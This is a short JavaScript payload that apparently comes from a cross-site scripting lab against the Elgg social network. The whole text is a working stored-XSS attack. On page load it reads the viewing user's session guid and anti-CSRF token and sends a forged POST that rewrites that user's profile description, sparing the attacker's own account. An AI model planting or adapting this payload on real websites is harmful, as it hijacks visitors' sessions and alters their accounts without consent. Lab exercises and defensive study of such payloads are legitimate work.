<script type="text/javascript">
window.onload = function(){
    // JavaScript code to access user name, user guid, Time Stamp_elgg_ts
    // and security Token_elgg_token
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid; 
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // Construct the content of your URL.
    var content = "&description=" + encodeURIComponent("I work at Google as a dog walker."); 

    var samyGuid = 59;

    var sendurl = "http://www.seed-server.com/action/profile/edit";

    if(elgg.session.user.guid != samyGuid) {
        // Create and send Ajax request to modify profile.
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content + guid + ts + token);
    }
}
</script>
